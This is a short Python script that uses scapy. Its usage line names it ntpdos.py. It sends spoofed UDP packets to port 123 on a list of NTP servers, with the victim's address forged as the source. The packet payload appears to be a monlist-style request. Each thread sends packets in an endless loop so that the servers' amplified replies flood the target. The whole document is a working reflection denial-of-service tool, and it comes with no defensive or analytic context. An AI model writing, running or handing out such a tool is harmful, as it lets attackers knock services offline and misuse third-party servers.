from scapy.all import *
from sys import argv
import threading
import random


DATA = "\x17\x00\x03\x2a" + "\x00" * 188


def send_ntp(target, server_ip):
	pack = IP(dst=server_ip, src=target) / UDP(sport=random.randint(2000, 65535), dport=123) / Raw(load=DATA)
	send(pack, loop=1)


def main():
	if len(argv) < 3:
		print("Usage: ntpdos.py target servers.txt threads")
	else:
		index = 0
		target = argv[1]
		filename = argv[2]
		num_threads = argv[3]
		threads = []
		with open(filename) as file:
			servers = file.readlines()
		try:
			for n in range(int(num_threads)):
				if index == len(servers):
					index = 0
				thread = threading.Thread(target=send_ntp, args=[target, servers[index].replace("\n", "")])
				thread.daemon = True
				thread.start()
				threads.append(thread)
				index += 1
			while True:
				pass
		except KeyboardInterrupt:
			print("Stopping...")


if __name__ == '__main__':
	main()
